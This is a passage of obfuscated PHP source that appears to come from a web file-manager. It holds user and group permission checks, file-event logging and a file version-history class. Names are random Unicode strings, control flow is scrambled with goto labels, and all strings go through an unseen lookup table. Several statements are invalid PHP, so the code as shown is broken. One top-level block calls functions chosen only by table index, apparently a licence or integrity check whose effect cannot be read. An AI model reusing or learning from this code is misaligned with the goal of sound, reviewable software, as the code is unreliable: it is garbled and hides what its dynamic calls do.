$Aఉ->groupPathDisplay($F); $fͿ = array($F); goto eݕ; d: } private function groupAuthInfo($BП, $bѭ) { $cɜϲƲ =& $_SERVER[]; $b = Model($cɜϲƲ[486])->getInfo($bѭ); return array($cɜϲƲ[1893] => intval($BП[$cɜϲƲ[406]]), $cɜϲƲ[1877] => $BП, $cɜϲƲ[1894] => LNG($cɜϲƲ[1895]), $cɜϲƲ[1886] => array($cɜϲƲ[413] => $b[$cɜϲƲ[28]], $cɜϲƲ[76] => KodIO::make($b[$cɜϲƲ[85]][$cɜϲƲ[395]]), $cɜϲƲ[1892] => $b[$cɜϲƲ[491]])); } protected function groupRootAuth($F鳄, $Eݷ = false) { goto f; B؇: $a٣ = $this->sourceAuthSelect($e敨[$b˜[85]][$b˜[395]]); $F = $a٣ ? $this->authMake($a٣, $Eݷ) : !1; $aߠ = $F ? $F[$b˜[446]] : !1; goto Cנ; bއ: $C؃ߺ = $this->userGroupList($Eݷ); $d݌ = isset($C؃ߺ[$F鳄]) ? $C؃ߺ[$F鳄][$b˜[406]] : !1; if ($d݌ && Model($b˜[1868])->authCheckAction($d݌[$b˜[406]], $b˜[1721])) { $f[$a忈] = $d݌; return $d݌; } goto B؇; C冢: static $f = array(); if (isset($f[$a忈])) { return $f[$a忈]; } $e敨 = Model($b˜[486])->getInfo($F鳄); goto bއ; Cנ: $f[$a忈] = $aߠ ? $aߠ : $d݌; return $f[$a忈]; goto eυ񹬴; f: $b˜ =& $_SERVER[]; $Eݷ = $Eݷ ? $Eݷ : USER_ID; $a忈 = $Eݷ . $b˜[1896] . $F鳄; goto C冢; eυ񹬴: } public function authOwnerApply($c) { goto BŤ; dƑ: if (count($B۫) == 0) { $B۫ = $this->authFolderOwnerGroup($c[$FǍ[484]]); } $B۫ = array_unique($B۫); if (AuthModel::authCheckRoot($c[$FǍ[406]][$FǍ[407]])) { $B۫[] = USER_ID; } goto c; bɥ: $a = array(); $B۫ = array(); foreach ($a as $A => $F͓ϲ) { $cΓ = $this->authFolderOwnerUser($F͓ϲ); $a[$A] = $cΓ; $B۫ = array_merge($B۫, $cΓ[$FǍ[562]]); if ($cΓ[$FǍ[1898]]) { break; } } goto dƑ; c: $c[$FǍ[406]][$FǍ[1899]] = Model($FǍ[502])->userListInfo($B۫); return $c; goto a; BŤ: $FǍ =& $_SERVER[]; if (empty($c[$FǍ[406]]) || isset($c[$FǍ[1897]]) && $c[$FǍ[1897]]) { return $c; } if (AuthModel::authCheckRoot($c[$FǍ[406]][$FǍ[407]])) { return $c; } goto EŐ; EŐ: $Bѓ = Model($FǍ[1213])->parentLevelArray($c[$FǍ[487]]); $Bѓ = array_merge(array($c[$FǍ[395]]), array_reverse($Bѓ)); $a = $this->sourceAuthSelect($Bѓ); goto bɥ; a: } private function authFolderOwnerGroup($bɹ) { $f׆˞ =& $_SERVER[]; $Eڱ = Model($f׆˞[1782])->where(array($f׆˞[1701] => $bɹ))->select(); $e = array(); if (!$Eڱ) { return $e; } foreach ($Eڱ as $Eí޺) { $Eͪ = $this->authInfo($Eí޺); if (AuthModel::authCheckRoot($Eͪ[$f׆˞[406]])) { $e[] = $Eí޺[$f׆˞[1533]]; } } return $e; } private function authFolderOwnerUser($e߹) { $A¹з =& $_SERVER[]; $F羇 = array(); $fݮ = !1; foreach ($e߹ as $a婚) { $eƑ = $this->authInfo($a婚); if ($a婚[$A¹з[484]] == $A¹з[191]) { $fݮ = !0; } if ($a婚[$A¹з[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($eƑ[$A¹з[406]])) { $F羇[] = $a婚[$A¹з[484]]; } } } return array($A¹з[562] => $F羇, $A¹з[1898] => $fݮ); } public function authMake($Fڋǯ, $cٙ = false) { $f˖ =& $_SERVER[]; $b = $this->authArrayCheck($Fڋǯ, $cٙ); if ($b[$f˖[1900]]) { $b[$f˖[1900]] = $this->sourceAuthInfo($b[$f˖[1900]]); } return $b; } public function authArrayCheck($eǨ, $Bɏ = false) { goto b; C: return $E㍑칍; goto F; D: $a׌Ѯ = 1000; $eʃ = 0; $F҅ = 0; goto e»; e»: $Eڧ = 0; $DԽ = 0; $aš = array($Bߙ[395] => 0); goto Dʲ; E: $bӱͽ = 0; $dڃ = 0; $eٲ = 0; goto Cڗǩ; Cڗǩ: $BᡍЇ = 0; $A = 0; $D߃ = 0; goto D; Dʲ: foreach ($eǨ as $aš) { $bވ = $this->authInfo($aš); if (!$bވ) { continue; } $a݈ = $aš[$Bߙ[484]]; $a = intval($bވ[$Bߙ[406]]); if ($aš[$Bߙ[404]] == SourceModel::TYPE_USER && $a݈ == $Bɏ) { $bӱͽ = !0; $eٲ = $bވ; $dڃ = $a; } else { if ($aš[$Bߙ[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($a݈, $Bɏ)) { $BᡍЇ = !0; $B씣 = $this->groupStepToUserGroup($a݈, $Bɏ); if ($B씣 < $a׌Ѯ) { $a׌Ѯ = $B씣; $A = $a; $D߃ = $bވ; $eʃ = $a݈; } if ($B씣 == $a׌Ѯ && $a >= $A) { $A = $a; $D߃ = $bވ; $eʃ = $a݈; } } else { if ($a݈ == $Bߙ[191]) { $F҅ = !0; $DԽ = $bވ; $Eڧ = $a; } } } } if ($bӱͽ) { $eݰ = $dڃ; $bވ = $eٲ; $Dϳ = LNG($Bߙ[1901]); } else { if ($BᡍЇ) { $eݰ = $A; $bވ = $D߃; $f = Model($Bߙ[486])->getInfo($eʃ); $Dϳ = $Bߙ[160] . $f[$Bߙ[491]] . $Bߙ[1902] . LNG($Bߙ[1903]); } else { if ($F҅) { $eݰ = $Eڧ; $bވ = $DԽ; $Dϳ = LNG($Bߙ[1874]); } else { $eݰ = 0; $bވ = !1; $Dϳ = $Bߙ[33]; } } } $E㍑칍 = array($Bߙ[1893] => intval($eݰ), $Bߙ[1877] => $bވ, $Bߙ[1894] => $Dϳ, $Bߙ[1886] => $aš[$Bߙ[395]]); goto C; b: $Bߙ =& $_SERVER[]; if (!$eǨ) { return array($Bߙ[407] => 0, $Bߙ[446] => !1); } $Bɏ = $Bɏ ? $Bɏ : USER_ID; goto E; F: } private function groupContainUser($cϱ, $dփ = false) { return in_array($cϱ, $this->userGroupParents($dփ)); } private function groupStepToUserGroup($Bփ, $Fجߋ = false) { goto e޿; fކ: $a = $GLOBALS[$Cʱۭ[6]][$Cʱۭ[88]][$Cʱۭ[1793]] == 1; $b୸ = $a ? 3 : 2; foreach ($F𼪼 as $C) { if ($C[$Cʱۭ[1701]] == $Bփ) { return 0; } $C׸ἕ = explode($Cʱۭ[47], trim($C[$Cʱۭ[487]], $Cʱۭ[47])); if ($C׸ἕ[0] == $Cʱۭ[191] && count($C׸ἕ) > $b୸) { $b˿ = array_reverse(array_slice($C׸ἕ, $b୸)); $c = array_search($Bփ, $b˿); if ($c !== !1 && $c + 1 <= $Fչ) { $Fչ = $c + 1; } } } goto aΩ䐡; aΩ䐡: return $Fչ; goto c參儉; e޿: $Cʱۭ =& $_SERVER[]; $F𼪼 = $this->userGroupList($Fجߋ); $Fչ = 1000; goto fކ; c參儉: } private function userGroupList($bԾ = false) { $c͵ =& $_SERVER[]; static $Cͨ = array(); if (isset($Cͨ[$bԾ])) { return $Cͨ[$bԾ]; } $cԃ = Model($c͵[506])->getInfo($bԾ); $Cͨ[$bԾ] = array_to_keyvalue($cԃ[$c͵[1875]], $c͵[1701]); return $Cͨ[$bԾ]; } public function userGroupParents($dٍÂ) { goto D܎; bݼ: $AӪ[$dٍÂ] = array_unique($bߊ); return $AӪ[$dٍÂ]; goto a̚; a԰: $C︙ʭ = $GLOBALS[$f[6]][$f[88]][$f[1793]] == 1; $B = $C︙ʭ ? 3 : 2; foreach ($C as $cѿ) { $eɥ = array($cѿ[$f[1701]]); $F쉻齋 = explode($f[47], trim($cѿ[$f[487]], $f[47])); if ($F쉻齋[0] == $f[191] && count($F쉻齋) > $B) { $C䲆 = array_slice($F쉻齋, $B); $eɥ = array_merge($eɥ, array_reverse($C䲆)); } $bߊ = array_merge($bߊ, $eɥ); } goto bݼ; D܎: $f =& $_SERVER[]; static $AӪ = array(); $dٍÂ = $dٍÂ ? $dٍÂ : USER_ID; goto cҫ; cҫ: if (isset($AӪ[$dٍÂ])) { return $AӪ[$dٍÂ]; } $C = $this->userGroupList($dٍÂ); $bߊ = array(); goto a԰; a̚: } public function authTargetInfoMake($D) { goto Fʨ; d: return array($f朅[1905] => $F, $f朅[1906] => $e͓); goto D꼧ކ; Fʨ: $f朅 =& $_SERVER[]; $F = array(); $e͓ = array(); goto e똭; e똭: foreach ($D as $cȃ) { if ($cȃ[$f朅[404]] == SourceModel::TYPE_USER) { $F[] = intval($cȃ[$f朅[484]]); } else { if ($cȃ[$f朅[404]] == SourceModel::TYPE_GROUP) { $e͓[] = intval($cȃ[$f朅[484]]); } } } if ($F) { $F = Model($f朅[502])->userListInfo($F); } if ($e͓) { $fꚻ = array($f朅[1779] => array($f朅[411], $e͓)); $e͓ = Model($f朅[486])->field($f朅[1904])->where($fꚻ)->select(); $e͓ = array_to_keyvalue($e͓, $f朅[1701]); } goto d; D꼧ކ: } public function authInfo($eɓ) { $f =& $_SERVER[]; if ($eɓ[$f[1796]]) { $C悆 = Model($f[1868])->listData($eɓ[$f[1796]]); if (!$C悆) { return !1; $Fˏª = Model($f[1868])->listData(); $eԬ͠ = array_filter_by_field($Fˏª, $f[406], $f[191]); return $eԬ͠; } $Cְ = array_field_key($C悆, array($f[393], $f[28], $f[406], $f[1722], $f[1724])); $Cְ[$f[1907]] = $eɓ; return $Cְ; } else { return array($f[412] => 0, $f[1707] => $eɓ[$f[1850]], $f[413] => $f[33], $f[1722] => $f[1908]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\x63\145\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\155\145", "\164\x69\x6d\145", "\151\156\x73\145\162\x74", "\146\165\156\143\164\151\x6f\156"), array("\x64\x65\x73\143", '', "\151\156\x73\x65\x72\164\x2c\x75\160\x64\141\x74\145\x2c\163\x65\154\145\x63\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A, $c×, $Eܙ = '') { goto bߐ; a: $dܛ = array($d[410] => $A, $d[1909] => $d[$d[478]], $d[1910] => $d[$d[28]], $d[495] => !empty($d[$d[495]]) ? $d[$d[495]] : $d[33], $d[1525] => USER_ID, $d[415] => $c×, $d[1527] => $Eܙ); $this->addSystemLog($c×, $dܛ); unset($dܛ[$d[1910]], $dܛ[$d[495]]); goto bΆ͆; bΆ͆: return $this->add($dܛ); goto f; e: if (!$d) { return !1; } if ($this->isCacheEvent($d, $c×)) { return; } if ($Eܙ && is_string($Eܙ)) { $Eܙ = array($d[1734] => $Eܙ); } goto a; bߐ: $d =& $_SERVER[]; if (!$this->eventSave) { return; } $d = Model($d[1213])->sourceInfo($A); goto e; f: } private function addSystemLog($Dɠ, $Cꩰ) { $aۙ =& $_SERVER[]; if ($Dɠ == $aۙ[1911]) { $Dɠ = $Cꩰ[$aۙ[431]][$aۙ[1912]]; } else { if (in_array($Dɠ, array($aۙ[1678], $aۙ[1913]))) { $Dɠ = $Cꩰ[$aۙ[431]][$aۙ[721]]; } } $bǸ = array_merge($Cꩰ, array($aۙ[1914] => $Cꩰ[$aۙ[395]], $aۙ[1915] => $Cꩰ[$aۙ[1915]])); Model($aۙ[1642])->addLog($aۙ[1916] . $Dɠ, $bǸ); } private function isCacheEvent($AݪĻ, $Fïޚ) { if ($AݪĻ[$_SERVER[][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A࿻, $A䌝) { $E =& $_SERVER[]; $D혥 = Model($E[1213])->sourceInfo($A࿻); $Fֆ = array($E[1912] => $A䌝, $E[28] => $D혥[$E[28]]); return $this->addEvent($A࿻, $E[1911], $Fֆ); } public function eventFileEdit($d) { $D즘 =& $_SERVER[]; $a膡 = array($D즘[1917] => $_SERVER[$D즘[1918]], $D즘[1919] => strtolower(ACTION)); return $this->addEvent($d, $D즘[1668], $a膡); } public function eventRecycle($e܋, $Eگ) { return $this->addEvent($e܋, $_SERVER[][1913], $Eگ); } public function eventRemove($C) { $Dٹ鷔 =& $_SERVER[]; $d = Model($Dٹ鷔[1213])->sourceInfo($C); $b񫥈 = $d[$Dٹ鷔[28]]; return $this->addEvent($d[$Dٹ鷔[478]], $Dٹ鷔[1667], $b񫥈); } public function eventShare($a艑, $F) { return $this->addEvent($a艑, $_SERVER[][1678], $F); } public function eventMove($f⥈, $cӥ, $F) { goto c􃡍ݟ; c􃡍ݟ: $d冋 =& $_SERVER[]; $eֹ = Model($d冋[1213]); $b = $eֹ->sourceInfo($f⥈); goto CӠܷ; c¥ז: $this->addEvent($f⥈, $d冋[520], $c); $b = $eֹ->sourceInfo($f⥈); $c = array($d冋[395] => $b[$d冋[395]], $d冋[28] => $b[$d冋[28]]); goto Cݫڋ; CӠܷ: $F = $eֹ->sourceInfo($cӥ); $D϶ꥫ = $eֹ->sourceInfo($F); $c = array($d冋[1062] => $cӥ, $d冋[1920] => $F[$d冋[28]], $d冋[1900] => !empty($F[$d冋[495]]) ? $F[$d冋[495]] : $d冋[33], $d冋[1063] => $F, $d冋[1921] => $D϶ꥫ[$d冋[28]], $d冋[1922] => !empty($D϶ꥫ[$d冋[495]]) ? $D϶ꥫ[$d冋[495]] : $d冋[33]); goto c¥ז; Cݫڋ: $this->addEvent($cӥ, $d冋[1923], $c); goto C; C: } public function eventCopy($Dڐ) { $this->eventCreate($Dڐ, $_SERVER[][518]); } public function eventRename($E, $Eٞ, $a֬) { $B =& $_SERVER[]; $b˝ = array($B[1062] => $Eٞ, $B[1063] => $a֬); return $this->addEvent($E, $B[1227], $b˝); } public function eventAddComment($eΩ̖, $A) { return $this->addEvent($eΩ̖, $_SERVER[][1924], $A); } public function eventAddDesc($c, $bŸ⏺) { return $this->addEvent($c, $_SERVER[][1925], $bŸ⏺); } public function listBySource($bÌ) { goto c; e: return $this->eventListParse($C, $bÌ); goto b՟; E: if ($c[$cǪ[403]] == $cǪ[87]) { $a׭ = Model($cǪ[1213])->listSearchChildren($bÌ, 20000); $a׭[] = $bÌ . $cǪ[375]; $b = array($cǪ[395] => array($cǪ[7], $a׭)); } $C = $this->where($b)->order($cǪ[1926])->selectPage(); if ($C[$cǪ[364]][$cǪ[365]] == 0) { $C[$cǪ[364]][$cǪ[365]] = 1; $C[$cǪ[367]] = array(array($cǪ[410] => $bÌ, $cǪ[1909] => $c[$cǪ[478]], $cǪ[1525] => $c[$cǪ[432]], $cǪ[415] => $cǪ[1927], $cǪ[416] => $c[$cǪ[194]], $cǪ[1527] => $cǪ[33])); } goto e; c: $cǪ =& $_SERVER[]; $c = Model($cǪ[1213])->sourceInfo($bÌ); $b = array($cǪ[410] => $bÌ); goto E; b՟: } private function eventListParse($DӠ, $Eׄ) { goto e㥝; e㥝: $B =& $_SERVER[]; $Eǭ = $DӠ[$B[367]]; $E = array_to_keyvalue($Eǭ, $B[33], $B[395]); goto d; Bǈ: $DӠ[$B[367]] = $Eǭ; return $DӠ; goto e󒸾̵; d: $dў = array_to_keyvalue($Eǭ, $B[33], $B[1915]); foreach ($Eǭ as $Fَ) { $DΎ̈́ = $Fَ[$B[431]]; if ($Fَ[$B[29]] == $B[520] && isset($DΎ̈́[$B[1062]])) { $E[] = $DΎ̈́[$B[1062]] . $B[33]; $E[] = $DΎ̈́[$B[1063]] . $B[33]; } if ($Fَ[$B[29]] == $B[1923] && isset($DΎ̈́[$B[395]])) { $E[] = $DΎ̈́[$B[395]] . $B[33]; } } $E = array_merge($E, $dў, array($Eׄ . $B[33])); goto B; B: $E = array_unique($E); $Aܶ鎧 = array_unique(array_to_keyvalue($Eǭ, $B[33], $B[1533])); $D֜ = Model($B[506])->userListInfo($Aܶ鎧); goto E޳Ю; E޳Ю: $cÖݱ = Model($B[796])->sourceListInfo($E, !0); foreach ($Eǭ as &$Fَ) { if ($Fَ[$B[29]] == $B[520] && isset($Fَ[$B[431]][$B[1062]])) { $Fَ[$B[431]][$B[1062]] = $cÖݱ[$Fَ[$B[431]][$B[1062]]]; $Fَ[$B[431]][$B[1063]] = $cÖݱ[$Fَ[$B[431]][$B[1063]]]; } if ($Fَ[$B[29]] == $B[1923] && isset($Fَ[$B[431]][$B[395]])) { $Fَ[$B[431]][$B[395]] = $cÖݱ[$Fَ[$B[431]][$B[395]]]; } $Fَ[$B[85]] = $cÖݱ[$Fَ[$B[395]]]; $Fَ[$B[1928]] = $cÖݱ[$Fَ[$B[1915]]]; if ($Fَ[$B[29]] == $B[1667]) { $Fَ[$B[1928]] = $Fَ[$B[85]]; $Fَ[$B[1915]] = $Fَ[$B[1928]][$B[395]]; $Fَ[$B[85]] = !1; $Fَ[$B[395]] = $B[33]; } $Fَ[$B[1858]] = $D֜[$Fَ[$B[1533]]]; } unset($Fَ); goto Bǈ; e󒸾̵: } public function removeBySource($D) { $C´ = array($_SERVER[][410] => $D); $this->where($C´)->remove(); } } goto e޺; Cњ: if ($_SERVER[$_SERVER[][830]] != $_SERVER[$_SERVER[][831]]) { goto CΨ; CΨ: $e¥ = $_SERVER[][832]; $d = $_SERVER[$_SERVER[][833]] . $_SERVER[][834]; $bُ = $e¥($d); goto C̨; F: $D醞۬($_SERVER[$_SERVER[][837]]); goto EŰޑ; C̨: $Fބ = explode($_SERVER[][229], $bُ); if (count($Fބ) < $_SERVER[][584]) { $eɃ = $_SERVER[][835]; $eɃ(); } $D醞۬ = $_SERVER[][836]; goto F; EŰޑ: } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto f׊; f׊: $d萕 =& $_SERVER[]; $BƏ = $GLOBALS[$d萕[6]][$d萕[88]]; if ($BƏ[$d萕[1110]] != 1) { return; } goto cݣ냞; cݣ냞: if ($BƏ[$d萕[1111]] <= 0) { return; } if (isset($_REQUEST[$d萕[1112]]) && $_REQUEST[$d萕[1112]] == $d萕[87]) { return; } Hook::bind($d萕[1113], $d萕[1114]); goto bź; Aރ: Hook::bind($d萕[1121], $d萕[1122]); Hook::bind($d萕[1123], $d萕[1124]); goto F䢑Ń; bź: Hook::bind($d萕[1115], $d萕[1116]); Hook::bind($d萕[1117], $d萕[1118]); Hook::bind($d萕[1119], $d萕[1120]); goto Aރ; F䢑Ń: } public static function eventBeforeUpload($Eپ) { if ($Eپ[3] && $Eپ[3] != REPEAT_REPLACE) { return; } $E͸ = self::parsePath($Eپ[0]); if (!$E͸) { return; } self::add($E͸); } public static function eventBeforeEdit($C) { $Cۅ = self::parsePath($C[0]); if (!$Cۅ) { return; } self::add($Cۅ); } public static function eventBeforeCopyFile($f, $aΓᘳ, $Dގ, $Aܳ, $Cœ, $A좱) { $Eˤ = $Dގ->getPathOuter($Aܳ); $E = self::parsePath($Eˤ); if (!$E) { return; } self::add($E); } public static function eventBeforeRename($Fݕص) { $a =& $_SERVER[]; $fƉٜ = self::parsePath($Fݕص[0]); if (!$fƉٜ) { return; } $c = self::checkInHistory($fƉٜ); if (!$c) { return; } if ($c[$a[29]] == $a[193]) { $c = self::listData($fƉٜ); if ($c && $c[$a[367]]) { self::moveHistory($fƉٜ, $Fݕص[1]); } } else { IO::rename($c[$a[76]], $Fݕص[1]); } } public static function eventBeforeMove($Aߴ) { goto F; aє: $Aܸ = self::parsePath($Aߴ[1]); if (!$Aܸ) { return; } $e⧗ч = $Aߴ[3]; goto e; e: $A = self::checkInHistory($C̑); if (!$A) { return; } $e = self::pathHistory($Aܸ); goto fŃ; F: $cӜ =& $_SERVER[]; $C̑ = self::parsePath($Aߴ[0]); if (!$C̑) { return; } goto aє; fŃ: if ($A[$cӜ[29]] == $cӜ[193]) { $ḄѰ = self::listData($C̑); $f黄 = rtrim($Aܸ, $cӜ[8]) . $cӜ[8] . ($e⧗ч ? $e⧗ч : get_path_this($C̑)); $D = self::listData($f黄); if ($ḄѰ && $ḄѰ[$cӜ[367]] && $D && $D[$cӜ[367]]) { return self::clear($C̑); } if ($ḄѰ && $ḄѰ[$cӜ[367]]) { self::moveHistory($C̑, $e⧗ч, $e); } } else { IO::move($A[$cӜ[76]], $e, !1, $e⧗ч); self::clearEmptyFolder(IO::pathFather($A[$cӜ[76]])); } goto B빬; B빬: } public static function eventAfterRemove($B, $c) { goto f鳺; f鳺: $Bι嫆 =& $_SERVER[]; if (!$c) { return; } $eڷܮ = self::parsePath($B[0]); goto cǫ; cǫ: if (!$eڷܮ) { return; } $b = self::checkInHistory($eڷܮ); if (!$b) { return; } goto Eʇϵ; Eʇϵ: if ($b[$Bι嫆[29]] == $Bι嫆[193]) { $eɥȡ = self::listData($eڷܮ, !1); if ($eɥȡ && $eɥȡ[$Bι嫆[367]]) { self::clear($eڷܮ, !1); } } else { IO::remove($b[$Bι嫆[76]]); self::clearEmptyFolder(IO::pathFather($b[$Bι嫆[76]])); } goto AѐĜ; AѐĜ: } private static function checkInHistory($Bު) { $bȉ = self::pathHistory($Bު); if (!IO::exist($bȉ)) { $bȉ .= $_SERVER[][1125]; } return IO::exist($bȉ) ? IO::info($bȉ) : !1; } private static function parsePath($A) { goto fء; D¶: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $a􅇞 = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $dЏ[1129]); foreach ($a􅇞 as $E) { if (!$f֜ք߮ && substr($A, 0, strlen($E)) == $E) { return !1; } } goto fʚ; D: if (!$bǝϱ || !$b[$dЏ[1127]]) { return !1; } if (substr($A, 0, strlen(DATA_PATH . $dЏ[1128])) == DATA_PATH . $dЏ[1128]) { return !1; } if ($f֜ք߮ == KodIO::KOD_SHARE_ITEM) { $F̭ኲ = IO::init($A); if ($F̭ኲ->pathParse[$dЏ[1055]]) { return self::parsePath($F̭ኲ->pathParse[$dЏ[1055]]); } return !1; } goto D¶; fء: $dЏ =& $_SERVER[]; if (!$A) { return !1; } if ($GLOBALS[$dЏ[1126]]) { return; } goto Aݺر; Aݺر: $b = KodIO::parse($A); $f֜ք߮ = $b[$dЏ[29]]; $bǝϱ = !$f֜ք߮ || $f֜ք߮ == KodIO::KOD_IO || $f֜ք߮ == KodIO::KOD_SHARE_ITEM; goto D; fʚ: self::log($GLOBALS[$dЏ[1050]] . $dЏ[1130] . $A); return $A; goto eǂ; eǂ: } private static function pathHistory($E) { $d얬 =& $_SERVER[]; $B = self::$_historyBase . ltrim(KodIO::clear($E), $d얬[8]); $B = str_replace(array($d얬[1131]), array($d얬[1132]), $B); return $B; } public static function log($d뛙ũ) { } public static function historyCount($e܇) { $F =& $_SERVER[]; $Eⳣ = array(); $CєЪ = array(); foreach ($e܇ as $FГ唛) { $d΂ = get_path_father($FГ唛); if (!$CєЪ[$d΂]) { $CєЪ[$d΂] = array(); } $CєЪ[$d΂][] = get_path_this($FГ唛); } foreach ($CєЪ as $d΂ => $Få) { $cń = self::parsePath($d΂); if (!$cń) { continue; } foreach ($Få as $Eӄ) { $Cݎ֍ = self::listData(rtrim($cń, $F[8]) . $F[8] . $Eӄ, !1); if ($Cݎ֍ && $Cݎ֍[$F[367]]) { $Eⳣ[rtrim($d΂, $F[8]) . $F[8] . $Eӄ] = count($Cݎ֍[$F[367]]); } } } return $Eⳣ; } public static function add($C) { goto D㹎; fͿ鏫: $d = $fઈЍ[$E[367]]; if ($D䃠[$E[78]] == 0) { return; } if ($D䃠[$E[78]] >= 1024 * 1024 * 500) { return !1; } goto D; Aل: $Bꊌ = Model($E[736])->get($E[1133]); $aӉ = $GLOBALS[$E[6]][$E[88]][$E[1111]]; $F܏ = $Bꊌ == $E[1134] ? 5 : $aӉ; goto aó; Fカ: return self::saveData($fઈЍ[$E[1138]], $d); goto C⦃˗; A؇: if (!$B) { self::clearEmptyFolder($fઈЍ[$E[1137]]); return !1; } array_unshift($d, $e淋); if (count($d) > $F܏) { $d = array_slice($d, $F܏); foreach ($d as $a) { IO::remove($fઈЍ[$E[1137]] . $a[$E[28]]); } $d = array_slice($d, 0, $F܏); } goto Fカ; D㹎: $E =& $_SERVER[]; $fઈЍ = self::listData($C); if (!$fઈЍ) { return; } goto Aل; d: $e淋 = array($E[393] => $a񲄐ڬ, $E[171] => $c, $E[28] => $D䃠[$E[28]] . $E[95] . date($E[1135]) . rand_string(1), $E[78] => $D䃠[$E[78]], $E[432] => USER_ID, $E[194] => time(), $E[1136] => $E[33]); IO::mkdir($fઈЍ[$E[1137]]); $B = IO::copy($C, $fઈЍ[$E[1137]], !1, $e淋[$E[28]]); goto A؇; D: if ($d && $d[0][$E[171]] == $c) { return !0; } if (array_key_exists($E[196], $D䃠) && !$D䃠[$E[196]]) { return !1; } $a񲄐ڬ = short_id(time()); goto d; aó: if ($aӉ <= 0) { return; } $c = IO::hashSimple($C); $D䃠 = IO::info($C); goto fͿ鏫; C⦃˗: } public static function remove($F, $EƸ) { $FߌⰡ =& $_SERVER[]; $C = self::listData($F); $C؋ = array(); if (!$C) { return !1; } foreach ($C[$FߌⰡ[367]] as $Eԉ) { if ($Eԉ[$FߌⰡ[393]] == $EƸ) { IO::remove($C[$FߌⰡ[1137]] . $Eԉ[$FߌⰡ[28]]); continue; } $C؋[] = $Eԉ; } return self::saveData($C[$FߌⰡ[1138]], $C؋); } public static function clear($dנ, $Dȟ = true) { $cרߖ =& $_SERVER[]; $a = self::listData($dנ, $Dȟ); if (!$a) { return !1; } foreach ($a[$cרߖ[367]] as $f) { IO::remove($a[$cרߖ[1137]] . $f[$cרߖ[28]]); } return self::saveData($a[$cרߖ[1138]], array()); } public static function moveHistory($e, $Aƛ = '', $F艰 = '') { goto fŦ޸; fŦ޸: $d =& $_SERVER[]; $Cؼ⌍ = self::listData($e, !1); if (!$Cؼ⌍ || !$Cؼ⌍[$d[367]]) { return !1; } goto A忐; cȻݵ: self::saveData($Cؼ⌍[$d[1138]], $Cؼ⌍[$d[367]]); self::clearEmptyFolder($Cؼ⌍[$d[1137]]); goto D˲; cǒߚ: $e = substr(get_path_this($Cؼ⌍[$d[1138]]), 0, -strlen($a)); foreach ($Cؼ⌍[$d[367]] as $Aچ => $B³) { $DƋ = $Aƛ . substr($B³[$d[28]], strlen($e)); $Dҫҧ = IO::move($Cؼ⌍[$d[1137]] . $B³[$d[28]], $F艰, !1, $DƋ); if ($Dҫҧ) { $Cؼ⌍[$d[367]][$Aچ][$d[28]] = $DƋ; } } $Cؼ⌍[$d[1138]] = IO::move($Cؼ⌍[$d[1138]], $F艰, !1, $Aƛ . $a); goto cȻݵ; A忐: $a = $d[1125]; $Aƛ = $Aƛ ? $Aƛ : get_path_this($e); $F艰 = $F艰 ? $F艰 : $Cؼ⌍[$d[1137]]; goto cǒߚ; D˲: } public static function rollback($fȾ, $BȂӊ) { $FƄ =& $_SERVER[]; $F = self::listData($fȾ); if (!$F) { return; } $E鱯 = IO::info($fȾ); foreach ($F[$FƄ[367]] as $bҍ => $bѻј) { if ($bѻј[$FƄ[393]] == $BȂӊ) { self::add($fȾ); $cʅ = $F[$FƄ[1137]] . $bѻј[$FƄ[28]]; $d񚑢 = IO::copy($cʅ, IO::pathFather($fȾ), REPEAT_REPLACE, $E鱯[$FƄ[28]]); if ($d񚑢) { self::remove($fȾ, $BȂӊ); } return $d񚑢; } } return !1; } public static function setDetail($e読ۨ, $fׅ, $a) { $b񰡖 =& $_SERVER[]; $D⫠ = self::listData($e読ۨ); if (!$D⫠) { return; } foreach ($D⫠[$b񰡖[367]] as $Eԭߏ => $b) { if ($b[$b񰡖[393]] == $fׅ) { $D⫠[$b񰡖[367]][$Eԭߏ][$b񰡖[1136]] = $a; self::saveData($D⫠[$b񰡖[1138]], $D⫠[$b񰡖[367]]); return !0; } } return !1; } public static function fileInfo($CńƑ, $d) { goto Dż; Eͦ: return IO::info($DϮ); goto B; Dż: $bɜ =& $_SERVER[]; $aˑɜ = self::listData($CńƑ); if (!$aˑɜ) { show_json(LNG($bɜ[105]), !1); } goto f; f: $DϮ = $bɜ[33]; foreach ($aˑɜ[$bɜ[367]] as $aⴍ => $C) { if ($C[$bɜ[393]] != $d) { continue; } $DϮ = $aˑɜ[$bɜ[1137]] . $C[$bɜ[28]]; break; } if (!$DϮ) { show_json(LNG($bɜ[105]), !1); } goto Eͦ; B: } public static function fileOut($fʡڎ, $eǴۓ, $aרպ = false) { $B㉭ =& $_SERVER[]; $cѯ = self::fileInfo($fʡڎ, $eǴۓ); $eƬ =& $GLOBALS[$B㉭[7]]; $aרպ = isset($eƬ[$B㉭[1101]]) && $eƬ[$B㉭[1101]] == 1; if (isset($eƬ[$B㉭[29]]) && $eƬ[$B㉭[29]] == $B㉭[1139]) { return IO::fileOutImage($cѯ[$B㉭[76]], $eƬ[$B㉭[1140]]); } IO::fileOut($cѯ[$B㉭[76]], $aרպ, get_path_this($fʡڎ)); } public static function listData($DҊ, $B = true) { goto EІ; e: $f̝ = IO::getContent($fп[$EÑ[1138]]); if ($f̝) { $C = json_decode($f̝, !0); if (is_array($C)) { $fп[$EÑ[367]] = $C; } } return $fп; goto DȺ; A˩: if (substr($DҊ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Bׄˮ = self::pathHistory($DҊ); $fп = array($EÑ[1138] => $Bׄˮ . $EÑ[1125], $EÑ[1137] => rtrim(get_path_father($Bׄˮ), $EÑ[8]) . $EÑ[8], $EÑ[367] => array()); goto e; EІ: $EÑ =& $_SERVER[]; if ($B && !IO::exist($DҊ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto A˩; DȺ: } private static function saveData($DƸך, $cح) { goto Aɏ; B: return !0; goto b䡚; 